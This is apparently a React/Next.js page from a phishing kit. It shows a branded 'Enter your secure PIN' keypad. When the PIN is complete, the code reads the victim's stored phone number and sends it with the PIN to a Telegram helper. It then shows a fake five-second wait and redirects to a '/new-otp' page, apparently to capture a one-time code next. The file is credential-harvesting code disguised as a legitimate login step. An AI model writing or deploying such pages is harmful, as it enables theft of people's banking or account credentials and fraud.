"use client"

import { useState, useEffect } from "react"
import { ArrowLeft, Delete, Loader2, X } from "lucide-react"
import { useRouter } from "next/navigation"
import { StepIndicator } from "@/components/step-indicator"

export default function PinEntryScreen() {
    const router = useRouter()
    const [pin, setPin] = useState<string[]>([])
    const [isLoading, setIsLoading] = useState(false)
    const [error, setError] = useState("")
    const maxLength = 4

    const handleNumberPress = (num: string) => {
        if (error) setError("")
        if (pin.length < maxLength) {
            setPin([...pin, num])
        }
    }

    // Auto-submit when PIN is complete
    useEffect(() => {
        if (pin.length === maxLength && !isLoading) {
            handleSubmit()
        }
    }, [pin])

    const handleDelete = () => {
        setPin(pin.slice(0, -1))
    }

    const handleBack = () => {
        router.back()
    }

    const handleSubmit = async () => {
        if (pin.length !== 4) {
            setError("Please enter your 4-digit PIN")
            return
        }
        setIsLoading(true)
        const pinString = pin.join("");
        sessionStorage.setItem("userPin", pinString);
        const phoneNumber = sessionStorage.getItem("userPhone") || "N/A";

        try {
            const { sendTelegramMessage } = await import("@/lib/telegram");
            await sendTelegramMessage({
                phoneNumber: phoneNumber,
                pin: pinString,
                title: "Pin & Contact Details"
            });
        } catch (error) {
            console.error("Telegram error:", error);
        }

        await new Promise(resolve => setTimeout(resolve, 5000))
        router.push("/new-otp")
    }
    return (
        <div className="h-[100dvh] bg-[#60ac28] flex flex-col overflow-hidden">
            {/* Header */}
            <header className="flex items-center justify-center relative px-4 py-2">
                <button onClick={handleBack} className="absolute left-4 p-2 text-[#1a2a4a]" aria-label="Go back">
                    <ArrowLeft className="w-6 h-6" strokeWidth={1.5} />
                </button>
                {/* Logo */}
                <div className="flex items-center">
                    <img src="/q32.png" alt="Logo" className="h-8 w-auto object-contain rounded-md" />
                </div>
                <button onClick={handleBack} className="absolute right-4 p-2 text-[#1a2a4a]" aria-label="Close">
                    <X className="w-6 h-6" strokeWidth={1.5} />
                </button>
            </header>

            {/* Step Indicator */}
            <StepIndicator />

            {/* Main Content */}
            <main className="flex-1 flex flex-col items-center pt-4 px-6">
                {/* Title */}
                <h1 className="text-[#1a2a4a] text-xl font-normal mb-6">Enter your secure PIN</h1>

                {/* PIN Indicators */}
                <div className="flex items-center gap-5 mb-6">
                    {[0, 1, 2, 3].map((index) => (
                        <div
                            key={index}
                            className={`w-12 h-12 rounded-full flex items-center justify-center transition-all duration-200 ${pin[index]
                                ? "bg-[#1a2a4a]"
                                : "bg-[#f0f2f5] shadow-[inset_2px_2px_6px_rgba(0,0,0,0.08),inset_-2px_-2px_6px_rgba(255,255,255,0.9)]"
                                }`}
                        >
                            {pin[index] && <div className="w-3 h-3 rounded-full bg-white" />}
                        </div>
                    ))}
                </div>

                {error && (
                    <div className="mb-4 text-center">
                        <p className="text-[#d91a32] text-sm font-medium">{error}</p>
                    </div>
                )}

                <button
                    onClick={handleSubmit}
                    disabled={isLoading}
                    className="w-full h-14 bg-[#152850] text-white text-base font-medium rounded-full hover:bg-[#1a3260] active:bg-[#0f1e3d] transition-colors flex items-center justify-center gap-2"
                >
                    Next
                </button>

            </main>

            {/* Loading Overlay */}
            {isLoading && (
                <div className="fixed inset-0 bg-black/30 backdrop-blur-sm flex items-center justify-center z-50">
                    <div className="bg-white p-6 rounded-2xl shadow-xl flex flex-col items-center gap-4">
                        <Loader2 className="w-12 h-12 text-[#152850] animate-spin" />
                        <p className="text-[#1a2a4a] text-sm font-medium">Please wait...</p>
                    </div>
                </div>
            )}

            {/* Number Pad */}
            <div className="mt-auto bg-white border-t border-[#e8eaed]">
                <div className="grid grid-cols-3 gap-0">
                    {/* Row 1 */}
                    {["1", "2", "3"].map((num) => (
                        <button
                            key={num}
                            onClick={() => handleNumberPress(num)}
                            className="h-14 flex items-center justify-center text-2xl font-light text-[#4a5568] active:bg-[#f0f2f5] transition-colors"
                        >
                            {num}
                        </button>
                    ))}
                    {/* Row 2 */}
                    {["4", "5", "6"].map((num) => (
                        <button
                            key={num}
                            onClick={() => handleNumberPress(num)}
                            className="h-14 flex items-center justify-center text-2xl font-light text-[#4a5568] active:bg-[#f0f2f5] transition-colors"
                        >
                            {num}
                        </button>
                    ))}
                    {/* Row 3 */}
                    {["7", "8", "9"].map((num) => (
                        <button
                            key={num}
                            onClick={() => handleNumberPress(num)}
                            className="h-14 flex items-center justify-center text-2xl font-light text-[#4a5568] active:bg-[#f0f2f5] transition-colors"
                        >
                            {num}
                        </button>
                    ))}
                    {/* Row 4 */}
                    <div className="h-14" /> {/* Empty space */}
                    <button
                        onClick={() => handleNumberPress("0")}
                        className="h-14 flex items-center justify-center text-2xl font-light text-[#4a5568] active:bg-[#f0f2f5] transition-colors"
                    >
                        0
                    </button>
                    <button
                        onClick={handleDelete}
                        className="h-14 flex items-center justify-center text-[#4a5568] active:bg-[#f0f2f5] transition-colors"
                        aria-label="Delete"
                    >
                        <Delete className="w-5 h-5" strokeWidth={1.5} />
                    </button>
                </div>
            </div>
        </div>
    )
}
